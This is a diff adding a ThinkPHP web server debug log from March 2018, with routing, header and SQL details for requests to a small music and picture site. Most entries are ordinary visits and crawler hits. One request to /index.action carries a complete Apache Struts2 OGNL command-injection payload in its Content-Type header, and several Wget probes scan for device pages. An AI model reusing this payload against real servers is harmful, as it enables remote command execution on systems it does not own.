@@ -1,0 +1,3213 @@
+[ 2018-03-14T00:04:38+08:00 ] 172.16.0.5 163.177.90.152 GET /index/music/index.html
+[ log ] www.00it.cn/index/music/index.html [运行时间：0.025737s][吞吐率：38.85req/s] [内存消耗：2,727.03kb] [文件加载：58]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'music',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Close',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'accept-encoding' => 'deflate, gzip',
+  'host' => 'www.00it.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Music->index[ /home/www/WWW/application/index/controller/Music.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/music/index.html [ array (
+  0 => 'nickname',
+  1 => 'value',
+  2 => 'data',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000325s ] mysql:dbname=zard;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `music` [ RunTime:0.000714s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `music` LIMIT 1 [ RunTime:0.000124s ]
+[ sql ] [ SQL ] SELECT * FROM `music` ORDER BY issue_time asc LIMIT 0,20 [ RunTime:0.000133s ]
+
+---------------------------------------------------------------
+[ 2018-03-14T00:26:50+08:00 ] 172.16.0.5 123.249.76.125 GET /
+[ log ] 123.207.34.110/ [运行时间：0.015747s][吞吐率：63.50req/s] [内存消耗：1,678.28kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'host' => '123.207.34.110',
+  'accept' => '*/*',
+  'user-agent' => 'User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T00:26:51+08:00 ] 172.16.0.5 123.249.76.125 GET /index.action
+[ log ] 123.207.34.110/index.action [运行时间：0.012922s][吞吐率：77.39req/s] [内存消耗：1,360.37kb] [文件加载：40]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index.action',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '123.207.34.110',
+  'content-type' => '%{(#nike=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'whoami\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',\'echo windows--2017\'}:{\'/bin/bash\',\'-c\',\'echo linux--2017\'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T01:03:08+08:00 ] 172.16.0.5 60.169.111.218 GET /
+[ log ] zard-forever.com/ [运行时间：0.014646s][吞吐率：68.28req/s] [内存消耗：1,679.72kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'connection' => 'keep-alive',
+  'host' => 'zard-forever.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T01:03:24+08:00 ] 172.16.0.5 60.169.111.218 GET /index/picture/index.html
+[ log ] zard-forever.com/index/picture/index.html [运行时间：0.027720s][吞吐率：36.08req/s] [内存消耗：2,597.78kb] [文件加载：55]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'picture',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'PHPSESSID=2qiopopf9dhjbgi7lg6djjavn2',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'referer' => 'http://zard-forever.com/',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'connection' => 'keep-alive',
+  'host' => 'zard-forever.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Picture->index[ /home/www/WWW/application/index/controller/Picture.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/picture/index.html [ array (
+  0 => 'picture',
+  1 => 'first_selected',
+  2 => 'second_selected',
+  3 => 'first',
+  4 => 'second',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000285s ] mysql:dbname=zard;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `picture` [ RunTime:0.000578s ]
+[ sql ] [ SQL ] SELECT * FROM `picture` WHERE  `first_type` = 0  AND `second_type` = 0 ORDER BY id asc LIMIT 15 [ RunTime:0.000233s ]
+
+---------------------------------------------------------------
+[ 2018-03-14T01:28:18+08:00 ] 172.16.0.5 47.93.90.175 GET /
+[ log ] 58.87.83.136:80/ [运行时间：0.015020s][吞吐率：66.58req/s] [内存消耗：1,677.85kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'connection' => 'Close',
+  'host' => '58.87.83.136:80',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T02:24:39+08:00 ] 172.16.0.5 123.151.42.61 GET /
+[ log ] www.baidu.com/ [运行时间：0.023571s][吞吐率：42.42req/s] [内存消耗：1,678.36kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '0',
+  'proxy-connection' => 'Keep-Alive',
+  'content-type' => 'text/html',
+  'accept' => '*/*',
+  'host' => 'www.baidu.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T02:27:26+08:00 ] 172.16.0.5 14.17.3.64 GET /index.asp
+[ log ] www.00it.cn/index.asp [运行时间：0.012249s][吞吐率：81.64req/s] [内存消耗：1,356.72kb] [文件加载：40]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index.asp',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Close',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'accept-encoding' => 'deflate, gzip',
+  'host' => 'www.00it.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T02:33:35+08:00 ] 172.16.0.5 123.125.71.51 GET /
+[ log ] www.joy-tee.com/ [运行时间：0.023401s][吞吐率：42.73req/s] [内存消耗：1,679.27kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip',
+  'if-none-match' => '"@NULL@"',
+  'accept-language' => 'zh-cn,zh-tw',
+  'user-agent' => 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
+  'connection' => 'close',
+  'host' => 'www.joy-tee.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T02:43:29+08:00 ] 172.16.0.5 66.249.64.84 GET /
+[ log ] idc.00it.cn/ [运行时间：0.020524s][吞吐率：48.72req/s] [内存消耗：1,679.37kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip,deflate,br',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+  'from' => 'googlebot(at)googlebot.com',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'host' => 'idc.00it.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T02:48:37+08:00 ] 172.16.0.5 112.90.82.236 GET /
+[ log ] 123.207.34.110/ [运行时间：0.031463s][吞吐率：31.78req/s] [内存消耗：1,679.08kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Close',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'accept-encoding' => 'deflate, gzip',
+  'host' => '123.207.34.110',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T03:05:14+08:00 ] 172.16.0.5 14.17.3.64 GET /index.action
+[ log ] 123.207.34.110/index.action [运行时间：0.013008s][吞吐率：76.88req/s] [内存消耗：1,356.73kb] [文件加载：40]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index.action',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Close',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'accept-encoding' => 'deflate, gzip',
+  'host' => '123.207.34.110',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T03:33:58+08:00 ] 172.16.0.5 119.147.207.152 GET /
+[ log ] www.zard-forever.com/ [运行时间：0.015086s][吞吐率：66.29req/s] [内存消耗：1,679.10kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Close',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'accept-encoding' => 'deflate, gzip',
+  'host' => 'www.zard-forever.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T03:50:52+08:00 ] 172.16.0.5 60.191.38.77 GET /
+[ log ] 123.207.34.110:80/ [运行时间：0.016185s][吞吐率：61.79req/s] [内存消耗：1,678.49kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'keep-alive',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',
+  'host' => '123.207.34.110:80',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T05:17:25+08:00 ] 172.16.0.5 178.154.171.74 GET /index/picture/index.html
+[ log ] zard-forever.com/index/picture/index.html [运行时间：0.021678s][吞吐率：46.13req/s] [内存消耗：2,593.75kb] [文件加载：55]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'picture',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip,deflate',
+  'from' => 'support@search.yandex.ru',
+  'user-agent' => 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
+  'connection' => 'Keep-Alive',
+  'host' => 'zard-forever.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Picture->index[ /home/www/WWW/application/index/controller/Picture.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/picture/index.html [ array (
+  0 => 'picture',
+  1 => 'first_selected',
+  2 => 'second_selected',
+  3 => 'first',
+  4 => 'second',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000237s ] mysql:dbname=zard;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `picture` [ RunTime:0.000557s ]
+[ sql ] [ SQL ] SELECT * FROM `picture` WHERE  `first_type` = 0  AND `second_type` = 0 ORDER BY id asc LIMIT 15 [ RunTime:0.000168s ]
+
+---------------------------------------------------------------
+[ 2018-03-14T05:49:48+08:00 ] 172.16.0.5 38.122.227.170 GET /
+[ log ] zard-forever.com/ [运行时间：0.018744s][吞吐率：53.35req/s] [内存消耗：1,677.41kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'zard-forever.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T05:53:45+08:00 ] 172.16.0.5 186.220.13.179 GET /cgi/common.cgi
+[ log ] 123.207.34.110/cgi/common.cgi [运行时间：0.011868s][吞吐率：84.26req/s] [内存消耗：1,355.55kb] [文件加载：40]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'cgi',
+    1 => 'common.cgi',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Wget(linux)',
+  'host' => '123.207.34.110',
+  'accept' => '*/*',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T05:53:50+08:00 ] 172.16.0.5 186.220.13.179 GET /stssys.htm
+[ log ] 123.207.34.110/stssys.htm [运行时间：0.012429s][吞吐率：80.46req/s] [内存消耗：1,355.47kb] [文件加载：40]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'stssys.htm',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Wget(linux)',
+  'host' => '123.207.34.110',
+  'accept' => '*/*',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T05:53:54+08:00 ] 172.16.0.5 186.220.13.179 GET /
+[ log ] 123.207.34.110/ [运行时间：0.015287s][吞吐率：65.42req/s] [内存消耗：1,677.82kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Wget(linux)',
+  'host' => '123.207.34.110',
+  'accept' => '*/*',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T06:38:51+08:00 ] 172.16.0.5 60.191.38.77 GET /
+[ log ] 123.207.34.110:80/ [运行时间：0.013836s][吞吐率：72.28req/s] [内存消耗：1,678.49kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'keep-alive',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',
+  'host' => '123.207.34.110:80',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T07:10:57+08:00 ] 172.16.0.5 14.17.21.58 GET /
+[ log ] 123.207.34.110/ [运行时间：0.017052s][吞吐率：58.64req/s] [内存消耗：1,679.08kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Close',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'accept-encoding' => 'deflate, gzip',
+  'host' => '123.207.34.110',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T07:54:21+08:00 ] 172.16.0.5 14.17.3.65 GET /stssys.htm
+[ log ] 123.207.34.110/stssys.htm [运行时间：0.011721s][吞吐率：85.32req/s] [内存消耗：1,356.73kb] [文件加载：40]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'stssys.htm',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Close',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'accept-encoding' => 'deflate, gzip',
+  'host' => '123.207.34.110',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T07:59:29+08:00 ] 172.16.0.5 183.57.53.196 GET /index/picture/index.html
+[ log ] zard-forever.com/index/picture/index.html [运行时间：0.022698s][吞吐率：44.06req/s] [内存消耗：2,594.09kb] [文件加载：55]
